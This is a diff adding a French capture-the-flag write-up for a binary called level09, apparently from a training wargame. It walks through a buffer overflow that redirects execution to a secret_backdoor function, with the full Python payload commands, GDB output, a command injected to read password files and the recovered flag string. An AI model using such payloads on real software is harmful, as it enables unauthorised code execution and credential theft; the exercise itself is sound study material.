@@ -1,0 +1,49 @@
+Le programme attend un username et un message à transmettre.
+On peut overflow avec l'username apres 40 chars, cela va override le valeur utilisee plus tard dans strncpy.
+On va donc pouvoir controler le nombre de char du message qu on va copier:
+
+On peut aussi trouver une fonction secret_backdoor:
+	$ nm level09
+	00000000000008c0 T handle_msg
+	0000000000000aa8 T main
+	000000000000088c T secret_backdoor
+	0000000000000932 T set_msg
+	00000000000009cd T set_username
+
+Bien que le Position Independent Executables (PIE) soit activé sur le binaire, le /proc/sys/kernel/randomize_va_space est set à 0.
+La memoire ne sera donc pas random, on va donc utiliser gdb pour connaire l'adresse de depart:
+	$ gdb level09
+	(gdb) b main
+	Breakpoint 1 at 0xaac
+	(gdb) run
+	Breakpoint 1, 0x0000555555554aac in main ()
+
+L'adresse est donc 0x0000555555554000.
+Le buffer dans handle_msg():
+	   0x00000000000008c4 <+4>:     sub    $0xc0,%rsp			; 192
+On va donc faire un buffer overflow de 192 + 8 chars:
+	$ (sleep 0.2 ; python -c 'print "A"*40 + "\xd0"'  ; sleep 0.2 ; python -c 'print "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ) | ./level09
+	sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
+
+On a atteris au milieu de nos 200 "A", on trouve le debut de l'arg apres 72chars:
+	$ (sleep 0.2 ; python -c 'print "A"*40 + "\xd0"' ; sleep 0.2 ; python -c 'print "A"*100 + "B"*100 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ) | ./level09
+	sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found
+
+Commande finale:
+	$ (sleep 0.2 ; python -c 'print "A"*40 + "\xd0"' ; sleep 0.2 ; python -c 'print "A"*72 + "/tmp/get;" + "B"*119 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ) | ./level09
+	--------------------------------------------
+	|   ~Welcome to l33t-m$n ~    v1337        |
+	--------------------------------------------
+	>: Enter your username
+	>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+	>>: >: Msg sent!
+	cat: /home/users/level01/.pass: Permission denied
+	cat: /home/users/level02/.pass: Permission denied
+	cat: /home/users/level03/.pass: Permission denied
+	cat: /home/users/level04/.pass: Permission denied
+	cat: /home/users/level05/.pass: Permission denied
+	cat: /home/users/level06/.pass: Permission denied
+	cat: /home/users/level07/.pass: Permission denied
+	cat: /home/users/level08/.pass: Permission denied
+	cat: /home/users/level09/.pass: Permission denied
+	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
